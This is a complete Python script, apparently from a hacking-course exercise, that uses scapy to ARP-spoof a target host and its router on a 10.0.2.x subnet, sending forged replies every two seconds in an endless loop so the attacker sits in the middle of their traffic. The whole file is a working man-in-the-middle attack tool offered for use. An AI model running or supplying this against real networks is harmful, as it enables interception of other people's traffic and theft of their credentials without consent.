#!/usr/bin/env python3

import scapy.all as scapy
import time
import subprocess
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)                                  
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")                  
    arp_request_broadcast = broadcast/arp_request                       
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]      
    return answered_list[0][1].hwsrc
       

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  
    scapy.send(packet, verbose=False)   # verbose=False removes the recurring print statement included with the function


# create a counter for packets sent
sent_packets_count = 0

# keep sending packets to spoof the target
# dynamically print the number of packets sent
while True:
    spoof("10.0.2.5", "10.0.2.1")  # tell the target that we are the router
    spoof("10.0.2.1", "10.0.2.5")  # tell the router that we are the target
    sent_packets_count += 2
    print("\r[+] Packets sent: " + str(sent_packets_count)),  # print at line start and remove \n (python 2 method)
    sys.stdout.flush()              # flush the stdout to print dynamically
    time.sleep(2)                   # create a 2 sec delay between packets to avoid flooding
    
